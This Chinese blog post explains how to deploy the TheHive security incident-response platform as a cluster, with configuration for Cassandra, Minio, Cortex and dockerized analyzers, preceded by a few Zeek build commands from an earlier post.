<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> --recursive https://github.com/zeek/zeek</span><br><span class="line">$ ./configure --with-pcap=/opt/PF_RING --enable-jemalloc</span><br><span class="line">$ make -j4</span><br><span class="line">$ sudo make install</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Canon">
      <meta itemprop="description" content="一个热爱健身的安全分析师">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Canon's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/" class="post-title-link" itemprop="url">浅谈TheHive平台在安全运营工作中的落地</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-05-03 23:39:48" itemprop="dateCreated datePublished" datetime="2021-05-03T23:39:48+08:00">2021-05-03</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2021-05-31 22:03:27" itemprop="dateModified" datetime="2021-05-31T22:03:27+08:00">2021-05-31</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/SIEM/" itemprop="url" rel="index"><span itemprop="name">SIEM</span></a>
        </span>
    </span>

  
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>29k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>27 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>​    随着企业安全建设的不断完善，信息安全的工作也进入了<em>Happy</em>（<strong>苦逼</strong>）的运营阶段。谈起安全运营工作，自然避不开事件响应这个话题。对于安全事件响应而言，我们时常会需要进行跨部门的协作。并且在某些事件中，我们甚至需要进行持续的跟踪与排查。因此，在事件的响应过程中，对于每一个响应步骤的记录显得尤为重要。它可以帮助我们在事件解决后，将经验教训纳入其中，加强整体安全能力。另一方面从自动化的角度来说，我们也应该考虑如何将响应过程转换为可被复用的<em>Playbook</em>，用以快速应对攻击，从而缩短感染攻击到遏制攻击的时间。</p>
<p>下面来说说我这的痛点，或者也可以说是我们在运营过程中所需要解决的一些问题：</p>
<ul>
<li>如何在事件响应过程中记录每一个响应步骤所花费的时间？这些任务的处理时间，将会直接影响到我们后期<em>MTTD</em>与<em>MTTR</em>的计算。</li>
<li>如何从安全事件中提炼<em>Playbook</em>？对于重复可被流程化的过程，自动化才是王道啊。</li>
<li>面对各种“<strong>骚</strong>”操作的攻击手法，如何提供更多可定制化的插件给安全分析人员使用，用以提升安全分析的效率？</li>
<li>如何快速的与现有的安全设备进行联动，并及时止损。</li>
<li>通常安全事件会涉及跨部门协作的情况，我们如何快速就此次事件展开分析并及时与协作部门之间同步事件进展。</li>
</ul>
<h1 id="安全事件响应平台-TheHive"><a href="#安全事件响应平台-TheHive" class="headerlink" title="安全事件响应平台 - TheHive"></a>安全事件响应平台 - <em>TheHive</em></h1><p>​    我最终选择了*<a target="_blank" rel="noopener" href="https://thehive-project.org/"><strong>TheHive</strong></a>* 安全事件响应平台来协助我进行日常的安全运营工作。<em>TheHive</em>不同于<em>SIEM</em>这类的产品，它主要对接的是需要被真实响应的事件。个人粗略汇总了一下它的特点：</p>
<ul>
<li><strong>融合协作</strong>：<em>TheHive</em>将安全事件视作<em>Case</em>，提倡多人、跨部门之间的协作。通过分享机制，可以快速与协作部门之间同步安全事件进展。</li>
<li><strong>成本度量</strong>：<em>TheHive</em>支持记录每个<em>Case</em>、<em>Task</em>的时间成本开销。可以帮助我们更好的去度量现有的<em>MTTD、MTTR</em>指标，也为我们后期去优化指标提供了重要的依据。</li>
<li><strong>快速响应</strong>：在事件响应的过程中，你会需要对已有的数据进行分析，并迅速提供补救措施来阻止攻击。<em>TheHive</em>的<em>Cortex</em>组件支持对数据进行快速的分析，并将已确认的<em>IoC</em>自动化推送到现有的安全设备完成与<em>SIEM、WAF、FW、EDR</em>的联动。</li>
<li><strong>效率提升</strong>：对于可被流程化的响应过程，必然是需要自动化的，也就少不了日常<em>Playbook</em>的积累。那么，<em>Playbook</em>从何而来？我们可以采用<em>TheHive</em>去记录每一次的安全事件响应的过程，并通过<em>Task</em>的形式去拆分需要协作的事项以及响应的步骤，利用这种方式帮助我们去积累<em>Playbook</em>。</li>
</ul>
<h2 id="TheHive集群部署"><a href="#TheHive集群部署" class="headerlink" title="TheHive集群部署"></a><em>TheHive</em>集群部署</h2><p>​    由于篇幅的关系，这里主要介绍的是采用<em>TheHive</em>集群时需要调整的一些配置。至于如何安装<em>TheHive</em>，请参考：<a target="_blank" rel="noopener" href="http://docs.thehive-project.org/thehive/installation-and-configuration/installation/step-by-step-guide/"><em><strong>Step-by-Step guide</strong></em></a>。如果只是为了测试的话，可以直接用官网提供的<em>Docker</em>或者<em>VM</em>镜像。</p>
<p>​    根据官方文档介绍，<em>TheHive</em>集群涉及4个部分。以下将会分别说明当采用<em>TheHive</em>集群时，<em>TheHive、Cortex、Cassandra、Minio</em>需要做的调整。</p>
<h3 id="Thehive"><a href="#Thehive" class="headerlink" title="Thehive"></a><em>Thehive</em></h3><p>​    我们将节点1视为主节点，通过编辑<code>/etc/thehive/application.conf</code>文件来配置<em>akka</em>组件，如下所示:</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## Akka server</span></span><br><span class="line"><span class="string">akka</span> &#123;</span><br><span class="line">  <span class="string">cluster.enable</span> <span class="string">=</span> <span class="string">on</span></span><br><span class="line">  <span class="string">actor</span> &#123;</span><br><span class="line">    <span class="string">provider</span> <span class="string">=</span> <span class="string">cluster</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="string">remote.artery</span> &#123;</span><br><span class="line">    <span class="string">canonical</span> &#123;</span><br><span class="line">      <span class="string">hostname</span> <span class="string">=</span> <span class="string">&quot;&lt;My IP address&gt;&quot;</span></span><br><span class="line">      <span class="string">port</span> <span class="string">=</span> <span class="number">2551</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">	<span class="comment"># seed node list contains at least one active node</span></span><br><span class="line">  <span class="string">cluster.seed-nodes</span> <span class="string">=</span> [</span><br><span class="line">    <span class="string">&quot;akka://application@&lt;Node 1 IP address&gt;:2551&quot;</span>,</span><br><span class="line">    <span class="string">&quot;akka://application@&lt;Node 2 IP address&gt;:2551&quot;</span>,</span><br><span class="line">    <span class="string">&quot;akka://application@&lt;Node 3 IP address&gt;:2551&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Cassandra"><a href="#Cassandra" class="headerlink" title="Cassandra"></a><em>Cassandra</em></h3><ul>
<li><p>集群配置</p>
<ul>
<li>使用以下参数更新配置文件：<code>/etc/cassandra/cassandra.yaml</code></li>
</ul>
 <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">cluster_name:</span> <span class="string">&#x27;thp&#x27;</span></span><br><span class="line"><span class="attr">num_tokens:</span> <span class="number">256</span></span><br><span class="line"><span class="attr">authenticator:</span> <span class="string">PasswordAuthenticator</span></span><br><span class="line"><span class="attr">authorizer:</span> <span class="string">CassandraAuthorizer</span></span><br><span class="line"><span class="attr">role_manager:</span> <span class="string">CassandraRoleManager</span></span><br><span class="line"><span class="attr">data_file_directories:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">/var/lib/cassandra/data</span></span><br><span class="line"><span class="attr">commitlog_directory:</span> <span class="string">/var/lib/cassandra/commitlog</span></span><br><span class="line"><span class="attr">saved_caches_directory:</span> <span class="string">/var/lib/cassandra/saved_caches</span></span><br><span class="line"><span class="attr">seed_provider:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">class_name:</span> <span class="string">org.apache.cassandra.locator.SimpleSeedProvider</span></span><br><span class="line">      <span class="attr">parameters:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">seeds:</span> <span class="string">&quot;&lt;ip node 1&gt;, &lt;ip node 2&gt;, &lt;ip node 3&gt;&quot;</span></span><br><span class="line"><span class="attr">listen_interface :</span> <span class="string">ens160</span>	<span class="comment"># 监听的接口</span></span><br><span class="line"><span class="attr">rpc_interface:</span> <span class="string">ens160</span>	<span class="comment"># 监听的接口</span></span><br><span class="line"><span class="attr">endpoint_snitch:</span> <span class="string">SimpleSnitch</span></span><br></pre></td></tr></table></figure>

<ul>
<li>删除文件 <code>/etc/cassandra/cassandra-topology.properties</code></li>
</ul>
 <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">$</span> <span class="string">rm</span> <span class="string">-rf</span> <span class="string">/etc/cassandra/cassandra-topology.properties</span></span><br></pre></td></tr></table></figure></li>
<li><p>启动服务</p>
<ul>
<li>在每个节点上启动服务</li>
</ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ service cassandra start</span><br></pre></td></tr></table></figure>

<ul>
<li>查询集群状态</li>
</ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ nodetool status</span><br><span class="line">Datacenter: datacenter1</span><br><span class="line">=======================</span><br><span class="line">Status=Up/Down</span><br><span class="line">|/ State=Normal/Leaving/Joining/Moving</span><br><span class="line">--  Address         Load       Tokens       Owns (effective)  Host ID                               Rack</span><br><span class="line">UN  192.168.199.35  449.33 KiB  256          100.0%            72e95db1-9c37-4a53-9312-76bd0b2e6ca7  rack1</span><br><span class="line">UN  192.168.199.36  631.65 KiB  256          100.0%            4051f9d4-91de-43e5-9a4a-c3da46417830  rack1</span><br><span class="line">UN  192.168.199.37  437.13 KiB  256          100.0%            8844626f-04c0-4dd3-855e-088935b8dc65  rack1</span><br></pre></td></tr></table></figure></li>
<li><p>初始化数据库</p>
<ul>
<li>修改数据库默认密码（默认账户密码：<code>cassandra</code>/<code>cassandra</code>）</li>
</ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cqlsh th01 -u cassandra</span><br><span class="line">cassandra@cqlsh&gt; ALTER USER cassandra WITH PASSWORD <span class="string">&#x27;HelloWorld&#x27;</span>;</span><br><span class="line">cassandra@cqlsh&gt; quit;</span><br></pre></td></tr></table></figure>

<ul>
<li>确保所有节点上的用户账户都是一致的</li>
</ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cqlsh &lt;ip node X&gt; -u cassandra</span><br><span class="line">cassandra@cqlsh&gt; ALTER KEYSPACE system_auth WITH replication = &#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;SimpleStrategy&#x27;</span>, <span class="string">&#x27;replication_factor&#x27;</span>: 3 &#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>创建名为<code>thehive</code>的<code>KEYSPACE</code></li>
</ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cassandra@cqlsh&gt; CREATE KEYSPACE thehive WITH replication = &#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;SimpleStrategy&#x27;</span>, <span class="string">&#x27;replication_factor&#x27;</span>: <span class="string">&#x27;3&#x27;</span> &#125; AND durable_writes = <span class="string">&#x27;true&#x27;</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>创建角色<code>thehive</code>，并授予<code>thehive</code> 权限（选择密码）</li>
</ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cassandra@cqlsh&gt; CREATE ROLE thehive WITH LOGIN = <span class="literal">true</span> AND PASSWORD = <span class="string">&#x27;HelloWorld&#x27;</span>;</span><br><span class="line">cassandra@cqlsh&gt; GRANT ALL PERMISSIONS ON KEYSPACE thehive TO <span class="string">&#x27;thehive&#x27;</span>;</span><br></pre></td></tr></table></figure></li>
<li><p><em>TheHive</em> 相关配置</p>
<p> 由于最新的<em>TheHive</em>集群需要配合<em>ElasticSearch</em>进行索引，因此需要同步更新如下配置：</p>
<ul>
<li>更新<code>/etc/thehive/application.conf</code>配置</li>
</ul>
 <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">db.janusgraph</span> &#123;</span><br><span class="line">  <span class="string">storage</span> &#123;</span><br><span class="line">    <span class="comment">## Cassandra configuration</span></span><br><span class="line">    <span class="attr">backend:</span> <span class="string">cql</span></span><br><span class="line">    <span class="attr">hostname:</span> [<span class="string">&quot;&lt;ip node 1&gt;&quot;</span>, <span class="string">&quot;&lt;ip node 2&gt;&quot;</span>, <span class="string">&quot;&lt;ip node 3&gt;&quot;</span>]</span><br><span class="line">    <span class="attr">username:</span> <span class="string">&quot;cassandra&quot;</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">&quot;HelloWorld&quot;</span></span><br><span class="line">    <span class="string">cql</span> &#123;</span><br><span class="line">      <span class="attr">cluster-name:</span> <span class="string">thp</span></span><br><span class="line">      <span class="attr">keyspace:</span> <span class="string">thehive</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">## Index configuration</span></span><br><span class="line">  <span class="string">index.search</span> &#123;</span><br><span class="line">    <span class="attr">backend:</span> <span class="string">elasticsearch</span></span><br><span class="line">    <span class="attr">hostname:</span> [<span class="string">&quot;&lt;es node 1&gt;&quot;</span>, <span class="string">&quot;es node 2&quot;</span>, <span class="string">&quot;es node 3&quot;</span>]</span><br><span class="line">    <span class="attr">index-name:</span> <span class="string">thehive</span></span><br><span class="line">    <span class="comment"># auth</span></span><br><span class="line">    <span class="string">elasticsearch.http.auth.type=basic</span></span><br><span class="line">    <span class="string">elasticsearch.http.auth.basic.username=elastic</span></span><br><span class="line">    <span class="string">elasticsearch.http.auth.basic.password=HelloWorld</span></span><br><span class="line">    <span class="comment"># ssl</span></span><br><span class="line">    <span class="string">elasticsearch.ssl.enabled=true</span></span><br><span class="line">    <span class="string">elasticsearch.ssl.truststore.location=/etc/thehive/truststore.jks</span></span><br><span class="line">    <span class="string">elasticsearch.ssl.truststore.password=HelloWorld</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Minio"><a href="#Minio" class="headerlink" title="Minio"></a><em>Minio</em></h3><p>​    由于我的文件存储是采用了<em>Minio</em>，所以这里需要配置一下。其实更简单的方式，你可以考虑使用<em>S3</em>。</p>
<ul>
<li>创建目录</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir /opt/minio</span><br></pre></td></tr></table></figure>

<ul>
<li>创建用户</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ adduser minio</span><br></pre></td></tr></table></figure>

<ul>
<li><p>创建数据卷</p>
<p> 在每台服务器上至少创建2个数据卷</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir -p /srv/minio/&#123;1,2&#125;</span><br><span class="line">$ chown -R minio:minio /srv/minio</span><br></pre></td></tr></table></figure>

<ul>
<li>修改主机名</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ vim /etc/hosts</span><br><span class="line">192.168.199.35  minio1</span><br><span class="line">192.168.199.36  minio2</span><br><span class="line">192.168.199.37  minio3</span><br></pre></td></tr></table></figure>

<ul>
<li>安装</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /opt/minio</span><br><span class="line">$ mkdir /opt/minio/&#123;bin,etc&#125;</span><br><span class="line">$ wget -O /opt/minio/bin/minio https://dl.minio.io/server/minio/release/linux-amd64/minio</span><br><span class="line">$ chown -R minio:minio /opt/minio</span><br></pre></td></tr></table></figure>

<ul>
<li><p>配置</p>
<ul>
<li>新建配置文件<code>/opt/minio/etc/minio.conf</code></li>
</ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MINIO_OPTS=<span class="string">&quot;server --address :9100 http://minio&#123;1...3&#125;/srv/minio/&#123;1...2&#125;&quot;</span></span><br><span class="line">MINIO_ACCESS_KEY=<span class="string">&quot;admin&quot;</span></span><br><span class="line">MINIO_SECRET_KEY=<span class="string">&quot;HelloWorld&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>新建系统启动文件<code>/usr/lib/systemd/system/minio.service</code></li>
</ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=minio</span><br><span class="line">Documentation=https://docs.min.io</span><br><span class="line">Wants=network-online.target</span><br><span class="line">After=network-online.target</span><br><span class="line">AssertFileIsExecutable=/opt/minio/bin/minio</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">WorkingDirectory=/opt/minio</span><br><span class="line">User=minio</span><br><span class="line">Group=minio</span><br><span class="line">EnvironmentFile=/opt/minio/etc/minio.conf</span><br><span class="line">ExecStart=/opt/minio/bin/minio <span class="variable">$MINIO_OPTS</span></span><br><span class="line">Restart=always</span><br><span class="line">LimitNOFILE=65536</span><br><span class="line">TimeoutStopSec=0</span><br><span class="line">SendSIGKILL=no</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure></li>
<li><p>启动</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ systemctl daemon-reload</span><br><span class="line">$ systemctl <span class="built_in">enable</span> minio</span><br><span class="line">$ systemctl start minio.service</span><br></pre></td></tr></table></figure>

<p>注：<em>这里记得确认一下权限的问题，权限不对的话会导致进程起不来。</em></p>
<ul>
<li><p>创建<em>bucket</em></p>
<ul>
<li>登录<em>Minio</em> <strong><a target="_blank" rel="noopener" href="http://minio1:9100/">http://minio1:9100</a></strong></li>
</ul>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/Minio-1.png" alt="Minio-1"></p>
<ul>
<li>创建<em>bucket</em></li>
</ul>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/Minio-2.png" alt="Minio-2"></p>
</li>
<li><p>修改<em>TheHive</em>配置文件 <code> /etc/thehive/application.conf</code></p>
</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## Attachment storage configuration</span></span><br><span class="line"><span class="string">storage</span> &#123;</span><br><span class="line">  <span class="attr">provider:</span> <span class="string">s3</span></span><br><span class="line">  <span class="string">s3</span> &#123;</span><br><span class="line">    <span class="string">bucket</span> <span class="string">=</span> <span class="string">&quot;thehive&quot;</span></span><br><span class="line">    <span class="string">readTimeout</span> <span class="string">=</span> <span class="number">1</span> <span class="string">minute</span></span><br><span class="line">    <span class="string">writeTimeout</span> <span class="string">=</span> <span class="number">1</span> <span class="string">minute</span></span><br><span class="line">    <span class="string">chunkSize</span> <span class="string">=</span> <span class="number">1</span> <span class="string">MB</span></span><br><span class="line">    <span class="string">endpoint</span> <span class="string">=</span> <span class="string">&quot;http://minio1:9100&quot;</span></span><br><span class="line">    <span class="string">accessKey</span> <span class="string">=</span> <span class="string">&quot;admin&quot;</span></span><br><span class="line">    <span class="string">secretKey</span> <span class="string">=</span> <span class="string">&quot;HelloWorld&quot;</span></span><br><span class="line">    <span class="string">region</span> <span class="string">=</span> <span class="string">&quot;us-east-1&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="string">alpakka.s3.path-style-access</span> <span class="string">=</span> <span class="string">force</span></span><br></pre></td></tr></table></figure>

<h3 id="Cortex"><a href="#Cortex" class="headerlink" title="Cortex"></a><em>Cortex</em></h3><ul>
<li><p>修改 <em>Cortex</em> 配置文件  <code>/etc/cortex/application.conf</code></p>
<p>这里注意，官方默认的配置文件有个小问题。当采用<em>Elastic</em>认证的时候需要将<code>username</code>修改为<code>user</code>，否则会报错。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">play.http.secret.key=<span class="string">&quot;QZUm2UgZYXF6axC&quot;</span></span><br><span class="line">search &#123;</span><br><span class="line">  index = cortex</span><br><span class="line">  uri = <span class="string">&quot;https://elasticsearch01:9200,elasticsearch02:9200,elasticsearch03:9200&quot;</span></span><br><span class="line">  user = <span class="string">&quot;elastic&quot;</span>	<span class="comment"># 修改username为user</span></span><br><span class="line">  password = <span class="string">&quot;HelloWorld&quot;</span></span><br><span class="line">  keyStore &#123;</span><br><span class="line">    path = <span class="string">&quot;/etc/cortex/truststore.jks&quot;</span></span><br><span class="line">    password = <span class="string">&quot;HelloWorld&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">  trustStore &#123;</span><br><span class="line">    path = <span class="string">&quot;/etc/cortex/truststore.jks&quot;</span></span><br><span class="line">    password = <span class="string">&quot;HelloWorld&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Analyzers-and-Responders"><a href="#Analyzers-and-Responders" class="headerlink" title="Analyzers and Responders"></a><em>Analyzers and Responders</em></h4><p>​    由于在<em>Cortex</em> 3中实现了对<em>dockerized</em>分析器的支持，安装过程已经被大大简化。因此，我们不必纠结于安装插件时的<em>Python</em>或其他库依赖项这种头疼的问题。</p>
<ul>
<li>安装<em>Docker</em></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Ubuntu 18.04</span></span><br><span class="line">$ wget -O- https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br><span class="line">$ add-apt-repository <span class="string">&quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable&quot;</span></span><br><span class="line">$ sudo apt-get update </span><br><span class="line">$ sudo apt-get install docker-ce</span><br></pre></td></tr></table></figure>

<ul>
<li>给<em>Cortex</em>账户运行<em>Docker</em>的权限</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ usermod -a -G docker cortex</span><br></pre></td></tr></table></figure>

<ul>
<li>更新配置文件<code>/etc/cortex/application.conf</code>，启用<code>analyzers.json</code></li>
</ul>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## ANALYZERS</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="string">analyzer</span> &#123;</span><br><span class="line">  <span class="string">urls</span> <span class="string">=</span> [</span><br><span class="line">    <span class="string">&quot;https://download.thehive-project.org/analyzers.json&quot;</span>	<span class="comment"># 本次新增</span></span><br><span class="line">    <span class="string">&quot;/etc/cortex/Cortex-Analyzers/analyzers&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># RESPONDERS</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="string">responder</span> &#123;</span><br><span class="line">  <span class="string">urls</span> <span class="string">=</span> [</span><br><span class="line">    <span class="string">&quot;https://download.thehive-project.org/responders.json&quot;</span> <span class="comment"># 本次新增</span></span><br><span class="line">    <span class="string">&quot;/etc/cortex/Cortex-Analyzers/responders&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>参考<ul>
<li><strong><a target="_blank" rel="noopener" href="https://blog.thehive-project.org/2019/11/20/unleash-the-power-of-dockerized-analyzers-in-5-minutes/">Unleash the Power of Dockerized Analyzers in 5 Minutes</a></strong></li>
</ul>
</li>
</ul>
<hr>
